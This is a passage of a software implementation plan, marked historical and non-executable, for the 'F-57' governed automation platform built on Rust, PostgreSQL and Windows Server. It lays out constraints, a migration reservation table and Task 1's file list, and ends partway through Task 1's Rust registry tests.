# F-57 Governed Automation Fabric Implementation Plan

> **状态：`HISTORICAL_DETAIL_INPUT`，永久禁止按本文件执行。** 2026-08-24 F-57 收敛设计、ADR-0025 与新五文件计划集已获用户批准。本文件只保留旧 25 项计划的字段、测试和推理来源；以下任务、迁移、命令和“GO”文字均不再发出实施指令。唯一执行入口是 `docs/superpowers/plans/2026-08-24-f57-converged-program.md`。

> **历史引用说明：** 本行原为面向执行者的实施提示，已于 2026-08-26 移除。保留该事实仅用于审计；本文件任何切片均不构成任务、命令、迁移、门禁或“GO”的执行指令。

**Goal:** Build the F-57 Windows Server authority node, four-platform Workbench, governed capability/package system, durable automation fabric, dynamic authorization, complete business closure, and ransomware-resilient production profile without starting local-model delivery.

**Architecture:** Extend the existing Rust/PostgreSQL workspace instead of replacing its financial and domain foundations. The Windows Server authority node owns every transaction, policy decision, signed generation, durable workflow and audit fact; clients, Excel, MCP, AI and plugins only submit typed intents through controlled capability contracts. New F-57 primitives are implemented first, then existing business-domain plans are rebased onto them and verified as end-to-end contract-to-cash and service cycles.

**Tech Stack:** Rust 2021 workspace, Tokio, Axum, SQLx, PostgreSQL 16, Windows Server 2022 SCM/Job Objects/NTFS/BitLocker/TPM, Tauri 2 + React/TypeScript subject to the Task 17 hard gate, Wasmtime component isolation, Windows Job Object workers, signed JCS manifests, Excel/CSV/Word/PDF adapters.

**Spec:** `docs/superpowers/specs/2026-08-23-f57-governed-automation-fabric-design.md`

## Global Constraints

- The only authoritative production server platform is native Windows Server 2022; Linux, WSL, Kubernetes and a vendor SaaS control plane are not runtime dependencies.
- The production baseline is ThinkStation P340 Tower, i5-10500, 32GB RAM, 256GB SSD, one 1TB HDD and about 20 active users.
- Every persistent customer datum or derivative, including PostgreSQL data/WAL/temp, attachments, indexes, audit/application logs, spool, exports, plugin work, pagefile and dumps, must be on the HDD data root.
- The SSD may contain only Windows, signed program files, static dependencies and re-downloadable model artifacts; local-model implementation remains deferred.
- The current machine is a `SINGLE_DISK_DEGRADED_PRODUCTION` profile. UPS, off-server append-only backup, offline encrypted rotation and a clean-server restore drill are go-live gates.
- The database authority is PostgreSQL 16. External databases are providers, never alternative writers to protected core schemas.
- Roles and job titles are templates only. Runtime authorization is principal + capability + scope + conditions + validity + device + risk + delegation.
- Every authoritative write uses a typed capability command, runtime re-authorization, idempotency, transaction/outbox, audit and generation/version evidence.
- Capability packages never inject arbitrary native DLLs or execute direct SQL. WASM and signed Windows Job Object workers are denied every resource until an approved manifest grants it. Hyper-V-isolated Windows containers for AI/OCR/industrial-protocol extensions are `HOST_CAPABILITY_CONDITIONAL`: first-release code, conformance and lifecycle support are required, but activation is denied until the actual host proves the exact host-feature, virtualization/nesting, isolation, capacity and security evidence defined by ADR-0023. The current 32GB P340 profile defaults this carrier off without declaring it deferred.
- Configuration generations are immutable, signed, desired/observed, atomically activated and rollback-capable. Running automation remains pinned to its definition and package versions.
- MCP is a governed tool/provider surface, not a transaction bus. Excel import is a validated proposal; Excel/VBA never connects to PostgreSQL.
- Windows, macOS, iOS and Android must have equivalent business outcomes and permissions. Interaction adapts to the device; server-side safety never depends on hidden UI.
- Statutory accounting, tax, payroll, full MRP/MES/WMS, active-active and the concrete local model are `DEFERRED_WITH_INTERFACE`.
- Implementation starts only after the user separately authorizes development. This document itself performs no code, migration, installation or production mutation.
- Migration files are introduced in strict Task order. Once any task applies a version to a retained development database, no later task may add a lower version；every database-bearing task also proves its exact apply-through prefix on a newly created PostgreSQL 16 database through the mandatory POST_GREEN gate defined below.
- Every new Rust crate, or any task that changes an existing crate's dependencies/features, lists and stages its parent `mod.rs`/`lib.rs`、owning `Cargo.toml`、root workspace dependency when required and a compiling test target. A new source file inside an existing crate that needs no manifest change does not force an empty `Cargo.toml` edit, but the same task must list/stage its module export and compile it through an explicit gate. An unreferenced source file is not an implementation.

### Executable binding rules (normative for all 25 tasks)

The design, the business execution contract, the client/lifecycle/security contract, ADR-0023, ADR-0024, the 185-row traceability matrix and `docs/f57-task-ownership.seed.tsv` are one indivisible execution input. A later task description may add detail but may not weaken these documents. If an older example, role name, path or state conflicts, these bindings win and the conflict is corrected in the same task before implementation continues.

- `docs/f57-task-ownership.seed.tsv` contains exactly one row for each of the 185 final RequirementIDs and freezes `owner_task`, `activation_task`, exact TestID, concrete test target, exact test symbol, EvidenceID, evidence schema and platform lane. Task 1 validates it and generates `docs/f57-task-ownership.toml` plus `docs/generated/f57-task-manifest.tsv`; developers do not assign ownership interactively.
- Before Tasks 2–25 red tests run `cargo xtask f57check --task F57-NN --phase pre-red`; Task 1 is the bootstrap exception because the checker does not exist yet, so its red proof is the failing `ep-xtask` unit-test artifact. For Tasks 1–24, the final checker command after the green suite is `cargo xtask f57check --task F57-NN --phase post-green`. Task 25 is the deliberate aggregation exception: its final checker command is `cargo xtask f57check --all --phase post-green`, which reruns and emits all 25 final-tree POST_GREEN receipts plus their signed manifest；only `f57-release-gate --check-task-gates` or `--prepare` may immediately follow as a direct consumer of that manifest. PRE_RED validates all predecessors and the current task's registered future targets while allowing those current targets/results to be absent；POST_GREEN additionally requires every due target compiled/non-ignored and every exact TestID/result/evidence binding PASS. The release requires 25/25 final-tree POST_GREEN receipts, not merely one scan or 25 unrelated historical receipts.
- Every activation task updates all affected registries in the same change: data dictionary, OpenAPI/IDL, commands/events/errors/metrics, capability and deferred-capability registries, permission policy, UI schema, migrations, tests and evidence manifest as applicable. `f57check` compares the task diff with its seed rows and rejects an implementation whose code changed without the required registry surfaces.
- Every command-receipt lookup occurs only after authenticating the current principal/device and evaluating current authorization. A receipt is bound to original principal, legal entity, command visibility, authorization context/version and idempotency key; another principal/device, revoked grant or narrower current visibility can neither infer nor replay it.
- Task 12 implements the business contract's per-objective closure registry and four-value `Unknown` human-decision exact set. Human judgment never fabricates a provider, bank, signature or delivery success fact.
- Tasks 3–5 materialize the exact owners, states, invariants and references in the business execution contract; Tasks 19–22 activate those machines and their full three-source order, six-source procurement/RFQ, service/project, portal-identity, close/reopen and fault matrices.
- Tasks 13–14 implement license/package/provider persistence and activation, not only manifest parsers. Provider permissions use ADR-0023's exact `ProviderManifestV1`, `PermissionCeilingV1`, `ResourceGrantV1` and four-way intersection.
- Tasks 16–18 implement the remote-support lifecycle, signed client distribution/update/revocation, employee C/S API, minimum offline projection and endpoint DLP contract. A rejected Task 17 stack is a hard stop for this plan until an all-Flutter replacement is approved and completed.
- Tasks 23–24 implement retention/legal hold/disposition, portable export, the explicit XML codec boundary, China-mainland residency, security-incident lifecycle, backup exhaustion/media states, UPS carriers, ADR-0024 backup key envelopes, successor-LTSC boundary and recovery certification policy.
- Task 25 aggregates `RequirementEvidenceBindingV1` records keyed by RequirementID; parallel, unjoined ID/path/result arrays are forbidden. Every record binds requirement, owner/activation task, TestID, target, symbol, run/result/digest, platform lane, generation and EvidenceID.

### Clean candidate-commit protocol (normative task transaction)

Formal lane evidence and POST_GREEN always measure a clean committed candidate tree；they never run against unstaged/staged implementation bytes. For every task, the apparent checklist order is interpreted by this single transaction protocol:

1. Start from the prior accepted clean commit. Run PRE_RED there (Task 1 uses its documented bootstrap failing unit proof), then create failing tests and implementation in the working tree.
2. Run every narrow/unit/integration command printed before that task's terminal `f57check ... post-green` as a **local candidate suite**. These results guide development but are not signed gate evidence and may run on dirty bytes.
3. Execute that task's listed `git add` closed file roster and create a **candidate commit** before the formal lane or terminal POST_GREEN command. Immediately require no unmerged entry、no non-ignored untracked path and both `git diff --exit-code` plus `git diff --cached --exit-code` PASS. A Files/commit-roster mismatch fails before signing.
4. On that clean candidate commit, run the task/profile's exact `cargo xtask ci ...` lane commands, then the task's terminal `f57check --phase post-green` (Task 25 uses `--all`). Only this run may emit signed evidence. The repository-tree manifest reads the stage-0 index whose bytes now equal HEAD and the working tree.
5. If a formal gate fails, keep the failing candidate for audit, make the smallest repair as a new candidate commit, restore the same clean-tree conditions and rerun every affected lane plus POST_GREEN. Do not amend、squash、rebase or otherwise change a passed candidate without rerunning evidence；a final history cleanup is allowed only before a complete evidence rerun on the resulting identical clean tree.

Accordingly, each task's printed “Run … POST_GREEN / Expected PASS” and following “Commit” block are not literal chronological inversions：split the Run line before its terminal formal lane/checker command, create the candidate with the Commit block, then execute that terminal command under steps 3–4 above. A task is complete only after the clean candidate passes；a local green working tree cannot be committed later and retroactively called the measured tree.

---

## 1. Execution order and file map

This is the sole F-57 execution entry. The 2026-08-10 fourteen-stage plan, F-55 local-AI plan and Linux `deploy/` material are source references only; an executor must not run them as a queue. Tasks are strictly ordered because later tasks consume signed types and migrations frozen by earlier tasks.

| Area | Create | Modify | Responsibility |
|---|---|---|---|
| F-57 governance | `xtask/src/f57check.rs`, `xtask/src/testutil.rs`, generated Task/TestID manifests | `xtask/src/main.rs`, registry Markdown files | Reject stale authority, unregistered requirements, migration collisions and forbidden production claims |
| Security/storage prerequisite | `crates/platform/runtime/src/deployment.rs`, `storage_policy.rs`, `crates/platform/secrets/*` | foundation KMS ports, KMS/file adapters, core-server boot | Verify the signed deployment manifest before DB startup; HDD secret vault, TPM/HSM wrapping and independent recovery |
| Business persistence baseline | exact aggregate migrations and `db-pg/src/{mdm,...,portal}` repositories | all contract/domain/application Cargo manifests and db-pg module registry | Materialize current business tables and repository ports before later F-57 migrations |
| Typed command authority | `crates/platform/command/*`, `platform_msg/command_receipts.rs` | core-server library/router/wiring, testkit | One typed command pipeline for every authoritative write |
| Deployment/capacity | `crates/platform/runtime/src/capacity.rs` | all persistence configs/adapters, worker scheduler, probes | HDD routing, low-resource scheduling and honest deployment state |
| Dynamic authorization | `crates/platform/authz/src/grant.rs`, `delegation.rs`, DB adapter files | foundation capability/principal, authz decision/snapshot | Capability-first, temporal/scoped grants, delegation, revocation and explain/simulate |
| Signed generations | `crates/platform/release/src/generation.rs`, `reconcile.rs` | release ports, core-server release wiring | Immutable desired/observed generation activation, drain and rollback |
| Customer data compiler | `crates/platform/meta/src/model.rs`, `compiler.rs`, `plan.rs` | existing meta DDL/identifier modules | Protected core zone plus relational extension tables and signed migration plans |
| Transactional evidence | outbox/inbox/dead-letter and audit entry/segment migrations and adapters | command pipeline, outbox, audit | A command, business facts, audit and outbox commit atomically |
| Durable automation | `crates/platform/flow/src/objective.rs`, `obligation.rs`, `effect.rs`, `checkpoint.rs`, `engine.rs` | existing state/step/compensation | Objective-to-evidence closure, resumability, unknown effects, compensation and cycles |
| Capability packages | `crates/platform/package/*` | workspace dependencies, license/release, plugin host | Separate F-56 license envelope from F-57 executable/configurable capability package lifecycle |
| Providers/MCP/AI | `crates/platform/provider/*`, `crates/contract/mcp/*` | integration gateway, WASM adapter, plugin host | Typed provider manifests, zero-default permissions, MCP tools and AI provider interface |
| Authority UI | `clients/control-center/*` | core-server routes | Server-resident governance UI for model, policy, package, generation, evidence and recovery |
| Workbench | `clients/workbench/*`, `crates/platform/sync/*` | root workspace/build/release | Tauri hard-gate prototype, four-platform shell, minimal offline cache and intent sync |
| Business closure | focused files below each existing domain/application/contract crate | existing domain skeletons and reserved migrations | Complete CRM-to-cash, procure-to-pay, inventory, service, project, finance and reporting loops |
| Operations | `installer/windows/*`, `scripts/windows/*`, `testkit/tests/f57_*` | ops/backup/archive apps, threat/config docs | Native service install, backups, clean restore, ransomware and P340 capacity certification |

### Reserved F-57 migration block

Task 1 rebases the migration catalog before any SQL is created. The versions below are strictly increasing in execution order and are the only new F-57 reservations. Tasks 2–6 first establish signed storage, the current business tables/repositories and the unified command bus; only then may the higher platform migrations start. All versions are after the current last historical reservation `20261024090800`.

| Version | Exact path | Owner |
|---|---|---|
| `20261025090000` | `db/migrations/platform_ops/V20261025090000__platform_ops_create_deployment_manifests.sql` | Task 2 signed pre-DB manifest |
| `20261025090100` | `db/migrations/platform_core/V20261025090100__platform_core_create_customer_secret_vault.sql` | Task 2 vault metadata/recovery recipients |
| `20261025090150` | `db/migrations/platform_file/V20261025090150__platform_file_create_objects_and_versions.sql` | Task 3 attachment identity/version foundation before any business link FK |
| `20261025090200` | `db/migrations/mdm/V20261025090200__mdm_create_current_business_tables.sql` | Task 3 MDM persistence |
| `20261025090300` | `db/migrations/crm/V20261025090300__crm_create_current_business_tables.sql` | Task 3 CRM persistence |
| `20261025090400` | `db/migrations/cpq/V20261025090400__cpq_create_current_business_tables.sql` | Task 3 CPQ persistence |
| `20261025090500` | `db/migrations/clm/V20261025090500__clm_create_current_business_tables.sql` | Task 3 CLM persistence |
| `20261025090600` | `db/migrations/sales/V20261025090600__sales_create_current_business_tables.sql` | Task 3 sales persistence |
| `20261025090700` | `db/migrations/procure/V20261025090700__procure_create_current_business_tables.sql` | Task 4 procurement persistence |
| `20261025090800` | `db/migrations/inventory/V20261025090800__inventory_create_current_business_tables.sql` | Task 4 inventory persistence |
| `20261025090900` | `db/migrations/costing/V20261025090900__costing_create_current_business_tables.sql` | Task 4 costing persistence |
| `20261025091000` | `db/migrations/invoice/V20261025091000__invoice_create_current_business_tables.sql` | Task 4 invoice persistence |
| `20261025091100` | `db/migrations/finance/V20261025091100__finance_create_current_business_tables.sql` | Task 4 finance persistence |
| `20261025091200` | `db/migrations/ledger/V20261025091200__ledger_create_current_business_tables.sql` | Task 4 operating-ledger persistence |
| `20261025091300` | `db/migrations/project/V20261025091300__project_create_current_business_tables.sql` | Task 5 project persistence |
| `20261025091400` | `db/migrations/service/V20261025091400__service_create_current_business_tables.sql` | Task 5 service/equipment persistence |
| `20261025091500` | `db/migrations/reporting/V20261025091500__reporting_create_current_business_tables.sql` | Task 5 reporting persistence |
| `20261025091600` | `db/migrations/portal/V20261025091600__portal_create_current_business_tables.sql` | Task 5 portal persistence |
| `20261025091700` | `db/migrations/platform_msg/V20261025091700__platform_msg_create_capability_command_receipts.sql` | Task 6 command authority |
| `20261025091800` | `db/migrations/platform_ops/V20261025091800__platform_ops_create_storage_capacity_evidence.sql` | Task 7 HDD/capacity evidence |
| `20261025091900` | `db/migrations/platform_authz/V20261025091900__platform_authz_create_capability_grants.sql` | Task 8 dynamic grants |
| `20261025092000` | `db/migrations/platform_authz/V20261025092000__platform_authz_create_delegations.sql` | Task 8 bounded delegation |
| `20261025092100` | `db/migrations/platform_meta/V20261025092100__platform_meta_create_release_generations.sql` | Task 9 desired/observed generations |
| `20261025092200` | `db/migrations/platform_meta/V20261025092200__platform_meta_create_customer_model_specs.sql` | Task 10 relational model compiler |
| `20261025092300` | `db/migrations/platform_msg/V20261025092300__platform_msg_create_outbox_inbox_dead_letters.sql` | Task 11 durable messages |
| `20261025092400` | `db/migrations/platform_audit/V20261025092400__platform_audit_create_entries_and_segments.sql` | Task 11 immutable audit |
| `20261025092500` | `db/migrations/platform_flow/V20261025092500__platform_flow_create_objective_graph.sql` | Task 12 objective/effect/evidence |
| `20261025092600` | `db/migrations/platform_flow/V20261025092600__platform_flow_create_execution_checkpoints.sql` | Task 12 checkpoints/leases/incidents |
| `20261025092700` | `db/migrations/platform_meta/V20261025092700__platform_meta_create_capability_packages.sql` | Task 13 package registry/lifecycle |
| `20261025092800` | `db/migrations/platform_meta/V20261025092800__platform_meta_create_provider_manifests.sql` | Task 14 provider/MCP manifests |
| `20261025092900` | `db/migrations/platform_meta/V20261025092900__platform_meta_create_ui_schema_versions.sql` | Task 16 signed adaptive UI |
| `20261025092910` | `db/migrations/platform_file/V20261025092910__platform_file_create_upload_quarantine_and_scan_evidence.sql` | Task 16 secure attachment intake before any current file route |
| `20261025092920` | `db/migrations/platform_ops/V20261025092920__platform_ops_create_support_sessions.sql` | Task 16 durable remote-support lifecycle/evidence |
| `20261025093000` | `db/migrations/platform_meta/V20261025093000__platform_meta_create_offline_intents.sql` | Task 18 client intent sync |
| `20261025093010` | `db/migrations/platform_core/V20261025093010__platform_core_harden_employee_device_state_and_wipe_evidence.sql` | Task 18 employee device authority/re-attestation/wipe evidence |
| `20261025093100` | `db/migrations/platform_file/V20261025093100__platform_file_extend_governed_lifecycle.sql` | Task 23 hold/disposition/tombstone/export-pin/document lifecycle extension |
| `20261025093200` | `db/migrations/platform_flow/V20261025093200__platform_flow_create_approval_cases.sql` | Task 23 reusable approvals |
| `20261025093300` | `db/migrations/platform_core/V20261025093300__platform_core_create_external_identity_links.sql` | Task 23 AD/LDAP identity links |
| `20261025093400` | `db/migrations/platform_meta/V20261025093400__platform_meta_create_search_definitions.sql` | Task 23 governed search |
| `20261025093500` | `db/migrations/platform_ops/V20261025093500__platform_ops_create_authority_epochs.sql` | Task 24 authority fencing plus aggregate backup/recovery control persistence |
| `20261025093510` | `db/migrations/platform_ops/V20261025093510__platform_ops_create_security_incidents.sql` | Task 24 durable incident lifecycle/milestones |
| `20261025093600` | `db/migrations/platform_core/V20261025093600__platform_core_backfill_f57_unpoliced_table_registry.sql` | Task 25 final RLS/unpoliced closure |

## 2. Release waves

| Wave | Tasks | Independently reviewable outcome |
|---|---|---|
| A — trusted authority substrate | 1–2 | F-57 registries, signed pre-DB manifest, HDD secret vault and independent recovery |
| B — persistence before platform expansion | 3–6 | all current business tables/repositories and one typed command authority before higher migrations |
| C — governed execution | 7–15 | capacity, dynamic auth, generations, relational meta, transaction evidence, automation, packages, providers and null AI |
| D — two-plane experience | 16–18 | server Control Center and one certified four-platform Workbench stack |
| E — business closure | 19–23 | correctly ordered sales, procurement/finance, service/project/reporting, portals/customization and office/provider loops |
| F — production proof | 24–25 | Windows native services, fencing, ransomware recovery, fresh PG16 and signed release evidence |

### Task 1: Rebaseline authority, the full F-55 block and executable manifests

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-governed-automation-fabric-design.md`
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-client-lifecycle-security-contract.md`
- Create: `xtask/src/f57check.rs`
- Create: `xtask/src/fresh_pg16.rs`
- Create: `xtask/src/testutil.rs`
- Create: `xtask/src/toolchain.rs`
- Create: `xtask/src/toolchain_provision.rs`
- Create: `xtask/src/native_measurement.rs`
- Create: `xtask/src/execution_context.rs`
- Create: `xtask/src/f57_signing.rs`
- Create: `xtask/tests/f57_evidence_signing.rs`
- Create: `xtask/tests/windows_cng_signing.rs`
- Create: `xtask/tests/fresh_pg16_profiles.rs`
- Create: `crates/foundation/src/signature.rs`
- Create: `crates/foundation/tests/signature.rs`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/README.md`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/vectors.json`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/valid-ecdsa.artifact.json`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/valid-rsa-pss.artifact.json`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/roots-active.p7b`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/roots-revoked.p7b`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/roots-stale-crl.p7b`
- Create: `crates/foundation/tests/fixtures/f56-cms-v1/roots-conflicting-highest-crl.p7b`
- Modify: `crates/foundation/src/lib.rs`
- Modify: `crates/foundation/Cargo.toml`
- Modify: `Cargo.toml`
- Modify: `Cargo.lock`
- Existing authoritative input: `docs/f57-task-ownership.seed.tsv`
- Existing authoritative input: `docs/f57-legacy-migration-disposition.seed.tsv`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Existing authoritative input: `docs/f57-fresh-pg-task-profiles.seed.tsv`
- Existing authoritative input: `docs/f57-ci-stage-registry.seed.tsv`
- Existing authoritative input: `docs/f57-ci-lane-task-profiles.seed.tsv`
- Create: `docs/f57-migration-reservations.tsv`
- Create: `docs/f57-task-ownership.toml`
- Create: `docs/generated/f57-task-manifest.tsv`
- Create: `docs/generated/f57-legacy-migration-disposition.tsv`
- Create: `docs/generated/f57-deferred-capability-registry.tsv`
- Create: `docs/generated/f57-deferred-capability-aliases.tsv`
- Create: `docs/generated/f57-objective-definitions.v1.json`
- Create: `docs/evidence/f57-task-gate-receipt.schema.json`
- Create: `docs/evidence/f57-task-gate-manifest.schema.json`
- Create: `docs/evidence/f57-test-result-manifest.schema.json`
- Create: `docs/evidence/f57-lane-evidence.schema.json`
- Create: `docs/evidence/f57-lane-stage-result.schema.json`
- Create: `docs/evidence/requirement-evidence-binding.schema.json`
- Create: `docs/evidence/f57-fresh-pg16-evidence.schema.json`
- Create: `docs/evidence/f57-toolchain-execution-manifest.schema.json`
- Create: `docs/evidence/f57-native-measurement-transfer.schema.json`
- Create: `docs/evidence/f57-execution-context.schema.json`
- Create: `docs/evidence/f57-objective-definitions.schema.json`
- Create: `docs/evidence/f57-recovery-domain-manifest.schema.json`
- Create: `docs/evidence/f57-ci-signing-policy.schema.json`
- Create: `docs/evidence/f57-repository-tree-manifest.schema.json`
- Create: `docs/evidence/f57-registry-snapshot.schema.json`
- Create: `docs/evidence/f57-due-target-manifest.schema.json`
- Create: `docs/evidence/f57-component-shape-registry.schema.json`
- Create: `docs/evidence/f57-direct-route-registry.schema.json`
- Create: `docs/evidence/f57-ci-signing-policy.toml`
- Modify: `xtask/Cargo.toml`
- Modify: `xtask/src/main.rs`
- Modify: `xtask/src/archcheck/foundation.rs`
- Modify: `xtask/src/archcheck/frozen.rs`
- Modify: `xtask/src/archcheck/source.rs`
- Modify: `xtask/src/ci.rs`
- Modify: `xtask/src/codecheck.rs`
- Modify: `xtask/src/reproduce.rs`
- Modify: `xtask/src/sign.rs`
- Modify: `xtask/src/e2e.rs`
- Modify: `xtask/src/configdoc.rs`
- Modify: `xtask/src/graph.rs`
- Modify: `.github/workflows/ci.yml`
- Modify: `.github/ci/pipeline-stages.tsv`
- Modify: `.github/ci/run-pipeline.sh`
- Modify: `.github/ci/verify-pipeline-commands.sh`
- Modify: `.github/ci/tests/run-negative.sh`
- Modify: `docs/ci-pipeline.md`
- Modify: `docs/superpowers/plans/2026-08-10-first-release-dev-plan/00b-technical-baseline.md`
- Modify: `scripts/dev-up.sh`
- Modify: `scripts/dev-down.sh`
- Modify: `scripts/verify-connection-budget.sh`
- Modify: `scripts/verify-orchestration-equivalence-negative.sh`
- Modify: `scripts/verify-orchestration-equivalence.py`
- Modify: `scripts/verify-release.sh`
- Modify: `scripts/verify-resource-limits.sh`
- Modify: `scripts/ep_compose_reader.py`
- Modify: `scripts/ep_orchestration_facts.py`
- Modify: `apps/plugin-host/src/main.rs`
- Modify: `apps/plugin-host/src/config.rs`
- Modify: `apps/core-server/src/config.rs`
- Modify: `apps/job-worker/src/config.rs`
- Modify: `apps/backup-writer/src/config.rs`
- Modify: `apps/archive-writer/src/config.rs`
- Modify: `crates/adapter/kms/src/cfg.rs`
- Modify: `crates/adapter/kms/src/masterkey.rs`
- Modify: `crates/platform/runtime/src/cli.rs`
- Modify: `crates/platform/runtime/src/config/mod.rs`
- Modify: `crates/platform/runtime/src/config/sections.rs`
- Modify: `crates/platform/runtime/src/selfcheck/items/basic.rs`
- Modify: `crates/platform/runtime/src/process.rs`
- Modify: `tools/migrate/src/cli.rs`
- Modify: `tools/migrate/src/versions.rs`
- Modify: `deploy/README.md`
- Modify: `deploy/ORCHESTRATION.md`
- Modify: `deploy/compose/compose.yaml`
- Modify: `db/migrations/platform_core/V20260901091500__platform_core_key_domains.sql`
- Modify: `db/migrations/platform_core/V20260901092000__platform_core_data_keys.sql`
- Modify: `db/migrations/platform_core/V20261012090500__platform_core_identity_user_credentials.sql`
- Modify: `docs/migration-catalog.md`
- Modify: `docs/config-reference.md`
- Modify: `docs/error-codes.md`
- Modify: `docs/event-catalog.md`
- Modify: `docs/metrics-catalog.md`
- Modify: `docs/data-dictionary.md`
- Modify: `docs/openapi/ai-admin.v1.yaml`
- Modify: `docs/openapi/ai-reporting.v1.yaml`
- Modify: `docs/openapi/finance.v1.yaml`
- Modify: `docs/openapi/invoice.v1.yaml`
- Modify: `docs/openapi/ledger.v1.yaml`
- Modify: `docs/openapi/mcp-management.v1.yaml`
- Modify: `docs/openapi/portal.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/data-dictionary/ai_mcp.md`
- Modify: `docs/data-dictionary/clm_sales.md`
- Modify: `docs/data-dictionary/cpq.md`
- Modify: `docs/data-dictionary/finance.md`
- Modify: `docs/data-dictionary/invoice.md`
- Modify: `docs/data-dictionary/ledger.md`
- Modify: `docs/data-dictionary/mdm.md`
- Modify: `docs/data-dictionary/platform_audit.md`
- Modify: `docs/data-dictionary/platform_flow.md`
- Modify: `docs/data-dictionary/portal.md`
- Modify: `docs/data-dictionary/procure.md`
- Modify: `docs/impact-catalog.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-requirements-traceability.md`
- Modify: `README.md`
- Test: `xtask/src/f57check.rs` unit tests、`xtask/tests/f57_evidence_signing.rs` and Windows Server 2022 `xtask/tests/windows_cng_signing.rs`

**Interfaces:**
- Consumes: F-57 requirement IDs and authority statuses from the design, traceability matrix and supersession register；the immutable 185-row ownership、310-row legacy-migration、437-row API discriminator、638-row discriminator component-shape、218-row component→state-domain、65-row state-domain、47-row direct-route、23-row FreshPG profile、11-row CI stage and 25-row CI lane/task profile seeds.
- Produces: `f57check::run(root: &Path, task: TaskId, phase: GatePhase) -> Result<SignedBusinessArtifactV1<F57TaskGateReceiptPayloadV1>, F57CheckError>`、the exact 42-row migration manifest、one generated Task/TestID manifest、the exact 310-row legacy disposition result、the exact 437-row API discriminator/version projection、the exact 638-row discriminator component-shape authority/projection、the exact 47-row direct-route/111-component projection、the exact 218-row closed state/result-filter/nested-item binding projection、the exact 11-row `DeferredCapabilityRegistryV1` and its exact 12-row operational-alias file、the exact 15-row `F57ObjectiveDefinitionsPayloadV1`、the exact CI stage/profile projections、strict toolchain/execution-context/stage/TestID result/evidence manifests and signed lane-evidence envelopes；Task 1–25 each produce a POST_GREEN receipt, and `--all --phase post-green` produces the final exact 25-row manifest.

- [ ] **Step 1: Write the failing registry tests**

```rust
#[test]
fn rejects_legacy_execution_entry_and_unmapped_requirement() {
    let repo = FixtureRepo::new()
        .file("README.md", "fourteen-stage direct execution")
        .file("docs/superpowers/reviews/f57-trace.md", "| GOV-001 | VERIFIED |");
    let err = run(repo.path(), TaskId::F57_01, GatePhase::PostGreen).unwrap_err();
    assert!(err.to_string().contains("F57_STALE_AUTHORITY_ENTRY"));
    assert!(err.to_string().contains("VERIFIED_WITHOUT_EVIDENCE"));
}

#[test]
fn accepts_unique_post_f56_migration_reservations() {
    let versions = reserved_f57_migrations();
    assert_eq!(versions.first().unwrap().version, 20261025090000);
    assert_eq!(versions.last().unwrap().version, 20261025093600);
    assert_eq!(versions.len(), 42);
    assert!(versions.windows(2).all(|pair| pair[0].version < pair[1].version));
}

#[test]
fn rejects_every_f55_row_from_the_current_release_queue() {
    let repo = FixtureRepo::new().migration_catalog_with_status(20261024090300, "PLANNED");
    assert_code(run(repo.path(), TaskId::F57_01, GatePhase::PostGreen), "F57_F55_BLOCK_EXECUTABLE");
}

#[test]
fn generated_test_manifest_is_exact_and_unique() {
    let rows = generate_task_manifest(FixtureRepo::real_traceability_fixture()).unwrap();
    assert!(rows.iter().all(|row| row.test_id == format!("T-F57-{}", row.requirement_id)));
    assert!(rows.iter().all(|row| row.evidence_id == format!("E-F57-{}", row.requirement_id)));
    assert_unique(rows.iter().map(|row| (&row.requirement_id, &row.test_id, &row.evidence_id)));
}

#[test]
fn legacy_and_deferred_registries_are_closed_and_seeded() {
    let legacy = generate_legacy_dispositions(FixtureRepo::real_migration_fixture()).unwrap();
    assert_eq!(legacy.len(), 310);
    assert!(legacy.iter().all(|row| row.disposition == "SUPERSEDED_BY_F57_REBASELINE"));
    assert!(legacy.iter().all(|row| !row.aggregate_owner_task.is_empty() && !row.aggregate_replacement_paths.is_empty()));

    let deferred = generate_deferred_capability_registry(FixtureRepo::real_contract_fixture()).unwrap();
    assert_eq!(deferred.boundaries.len(), 11);
    assert_eq!(deferred.aliases.len(), 12);
    assert!(deferred.boundaries.iter().all(|row| row.activation_adr == "REQUIRED" && row.activation_evidence == "REQUIRED"));
}

#[test]
fn api_discriminator_seed_is_exact_versioned_and_surface_closed() {
    let registry = load_api_discriminator_seed(FixtureRepo::real_repository()).unwrap();
    assert_eq!(registry.rows().len(), 437);
    assert_eq!(registry.rows().iter().filter(|row| row.operation_error_code != "NONE").count(), 22);
    assert!(registry.rows().iter().filter(|row| row.operation_error_code != "NONE").all(|row| row.owner_task == "F57-23" && row.variant_kind == "COMMAND"));
    assert_eq!(registry.slice("CONTROL", "1.2.0-f57").counts(), (51, 33));
    assert_eq!(registry.slice("EMPLOYEE", "1.4.0-f57").counts(), (230, 102));
    assert_eq!(registry.slice("PORTAL", "1.0.0-f57").counts(), (10, 11));
    assert_eq!(registry.planned_tasks("CONTROL", "1.2.0-f57"), ["F57-16", "F57-23", "F57-24"]);
    assert_eq!(registry.planned_tasks("EMPLOYEE", "1.4.0-f57"), ["F57-18", "F57-19", "F57-20", "F57-21", "F57-23"]);
}

#[test]
fn api_component_shape_seed_is_closed_and_covers_every_named_component() {
    let api = load_api_discriminator_seed(FixtureRepo::real_repository()).unwrap();
    let shapes = load_api_component_shape_seed(FixtureRepo::real_repository()).unwrap();
    assert_eq!(shapes.rows().len(), 638);
    assert_eq!(shapes.schema_keys(), api.distinct_payload_and_result_schema_keys());
    assert_eq!(shapes.profile_count(), 13);
    assert_eq!(shapes.explicit_component_count(), 68);
